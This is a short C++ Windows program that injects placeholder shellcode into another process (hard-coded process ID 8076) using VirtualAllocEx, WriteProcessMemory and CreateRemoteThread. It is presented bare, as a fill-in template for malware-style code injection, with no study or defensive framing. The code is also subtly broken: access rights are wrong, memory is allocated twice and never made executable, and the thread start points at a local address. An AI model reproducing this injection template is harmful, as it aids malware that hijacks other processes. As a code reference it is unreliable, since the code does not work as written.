#include <iostream>
#include <fstream>
#include <windows.h>
#include <tlhelp32.h>

#define BUFFER_SIZE 1024

int main() {
    // Check if process with ID 8076 exists
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, 8076);
    if (!hProcess) return -1;

    // Inject shellcode into the target process
    char shellcode[] = "\x90\x90\x90..."; // Replace with your actual shellcode

    DWORD written;
    VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, (LPVOID)VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_READWRITE), shellcode, sizeof(shellcode), &written);

    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(void*)shellcode, NULL, 0, NULL);

    CloseHandle(hProcess);
    return 0;
}